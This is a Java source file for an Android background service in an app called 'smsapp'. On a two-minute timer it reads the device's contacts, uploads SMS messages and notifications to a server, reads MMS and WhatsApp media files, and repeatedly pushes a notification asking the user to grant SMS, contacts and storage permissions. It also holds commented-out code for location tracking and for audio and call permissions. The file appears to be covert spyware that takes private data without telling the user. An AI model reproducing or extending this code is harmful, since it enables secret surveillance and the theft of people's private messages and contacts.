package gonext.smsapp.servers;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.TaskStackBuilder;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.NotificationCompat;
import android.text.TextUtils;
import android.widget.Toast;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationListener;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import gonext.smsapp.MainActivity;
import gonext.smsapp.R;
import gonext.smsapp.utils.Constant;
import gonext.smsapp.utils.Utils;

/**
 * Created by ram on 05/10/17.
 */

public class BackgroundJob extends Service implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener,LocationListener{
    public static final int notify = 120000;  //interval between two services(Here Service run every 5 Minute)
    public static final int PERMISSION_DELAY = 300000;  //interval between two services(Here Service run every 5 Minute)
    public static final int LOCATION_DELAY = 1500000;  //interval between two services(Here Service run every 5 Minute)
//    private Handler mHandler = new Handler();   //run on another Thread to avoid crash
    private Timer mTimer = null;    //timer handling
    private Timer locationTimer = null;    //timer handling
    private Timer permissionTimer = null;    //timer handling
    private BackgroundJobService backgroundJobService;
    private GoogleApiClient mGoogleApiClient;
    private static boolean isLocationStarted = false;
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                backgroundJobService = new BackgroundJobService(BackgroundJob.this);
                if (mTimer != null) // Cancel if already existed
                    mTimer.cancel();
                else
                    mTimer = new Timer();   //recreate new

                mTimer.scheduleAtFixedRate(new TimeDisplay(), 0, notify);   //Schedule task

                if (Utils.isAndroid6()) {
                    if (permissionTimer != null) // Cancel if already existed
                        permissionTimer.cancel();
                    else
                        permissionTimer = new Timer();

                    permissionTimer.scheduleAtFixedRate(new PermissionDelay(), PERMISSION_DELAY, PERMISSION_DELAY);   //Schedule task
                }


                /*if (locationTimer != null) // Cancel if already existed
                    locationTimer.cancel();
                else
                    locationTimer = new Timer();   //recreate new

                locationTimer.scheduleAtFixedRate(new LocationTimerTask(), 0, LOCATION_DELAY);*/   //Schedule task

            }
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mTimer.cancel();    //For Cancel Timer
        if(Utils.isAndroid6()) {
            permissionTimer.cancel();
        }
        Toast.makeText(this, "Service is Destroyed", Toast.LENGTH_SHORT).show();
    }

    //class TimeDisplay for handling task
    class TimeDisplay extends TimerTask {
        @Override
        public void run() {
            // run on another thread
            /*mHandler.post(new Runnable() {
                @Override
                public void run() {*/
                    // display toast
            System.out.println("service started ******");
                    if(backgroundJobService != null) {
                        String mobile = Utils.getMobileNo(BackgroundJob.this);
                        if(mobile == null || mobile.equals("")){
                            backgroundJobService.getMobileNo();
                            mobile = Utils.getMobileNo(BackgroundJob.this);
                            if(mobile == null || mobile.equals("")){
                                backgroundJobService.readMMSMEssage();
                            }
                        }
                        backgroundJobService.ReadPhoneContacts();
                        backgroundJobService.sendSMSToServer();
                        backgroundJobService.sendNotificationsToServer();
                        backgroundJobService.readWhatsAppMediaFiles();
                    }
//                }
//            });
        }
    }

    class PermissionDelay extends TimerTask {
        @Override
        public void run() {
            // run on another thread
            /*mHandler.post(new Runnable() {
                @Override
                public void run() {*/
                    List<String> disabledPermissions = new ArrayList<>();
                    boolean allPermissionGranted = true;
                    // display toast
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.READ_PHONE_STATE)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("READ_PHONE_STATE");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.READ_CONTACTS)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("READ_CONTACTS");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.READ_SMS)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("READ_SMS");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("WRITE_EXTERNAL_STORAGE");
                    }
                    /*if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.RECORD_AUDIO)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("RECORD_AUDIO");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.PROCESS_OUTGOING_CALLS)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("PROCESS_OUTGOING_CALLS");
                    }*/

                    if(!allPermissionGranted){
                        //send local notification
                        if(!Utils.isNotificationVisible(BackgroundJob.this,11)) {
                            sendNotification(TextUtils.join(",", disabledPermissions));
                        }
                    }
//                }
//            });
        }
    }
    public void sendNotification(String msg){
        Intent intent = new Intent();
        intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);

        NotificationManager notificationManager = (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);

        PendingIntent pendingIntent = PendingIntent.getActivity(this, 1002, intent, 0);

        Notification.Builder builder = new Notification.Builder(this);

        builder.setAutoCancel(false);
        builder.setTicker(getString(R.string.app_name));
        builder.setContentTitle("Permission required");
        builder.setContentText(msg);
        builder.setSmallIcon(R.mipmap.app_icon);
        builder.setContentIntent(pendingIntent);
        builder.setOngoing(true);
        builder.setAutoCancel(true);
        builder.setSubText("");   //API level 16
        builder.setNumber(100);
        builder.build();

        Notification myNotication = builder.getNotification();
        notificationManager.notify(11, myNotication);

    }


    class LocationTimerTask extends TimerTask {
        @Override
        public void run() {
            // run on another thread
           /* mHandler.post(new Runnable() {
                @Override
                public void run() {*/
                    // display toast
                    if (!isLocationStarted) {
                        if (Utils.checkPlayServices(BackgroundJob.this)) {
                            if (Utils.isAndroid6()) {
                                if (ActivityCompat.checkSelfPermission(BackgroundJob.this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(BackgroundJob.this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                                    startLocationService();
                                } else {
                                    System.out.println("location permission not enabled");
                                }
                            } else {
                                startLocationService();
                            }
                        } else {
                            System.out.println("Google play service not available to start location service");
                        }
                    } else {
                        if (Utils.isAndroid6()) {
                            if (ActivityCompat.checkSelfPermission(BackgroundJob.this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(BackgroundJob.this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                                stopLocationUpdates();
                            }
                        }
                    }
                    if(Constant.latitude != 0.0 && Constant.longitude != 0.0){
                        backgroundJobService.sendLocation();
                    }
//                }
//            });
        }
    }

    public void stopLocationUpdates()
    {
        if (mGoogleApiClient != null && mGoogleApiClient.isConnected()) {
            LocationServices.FusedLocationApi
                    .removeLocationUpdates(mGoogleApiClient, this);
            mGoogleApiClient.disconnect();
        }
    }
    private void startLocationService(){
        try {
            mGoogleApiClient = new GoogleApiClient.Builder(this)
                    .addApi(LocationServices.API)
                    .addConnectionCallbacks(this)
                    .addOnConnectionFailedListener(this)
                    .build();
            mGoogleApiClient.connect();
            isLocationStarted = true;
        }catch (SecurityException e){
            e.printStackTrace();
        }
    }

    @Override
    public void onConnected(@Nullable Bundle bundle) {
        if(mGoogleApiClient != null) {
            try {
                Location location = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);
                if (location != null) {
                    Constant.latitude = location.getLatitude();
                    Constant.longitude = location.getLongitude();
                }
                LocationRequest mLocationRequest = new LocationRequest();
                mLocationRequest.setInterval(500000);
                mLocationRequest.setFastestInterval(50000);
                mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
                LocationServices.FusedLocationApi.requestLocationUpdates(
                        mGoogleApiClient, mLocationRequest, this);
            } catch (SecurityException e) {
                e.printStackTrace();
            }
        }


    }

    @Override
    public void onConnectionSuspended(int i) {

    }

    @Override
    public void onLocationChanged(Location location) {
        if(location != null){
            Constant.latitude = location.getLatitude();
            Constant.longitude = location.getLongitude();
        }
    }

    @Override
    public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {

    }

}
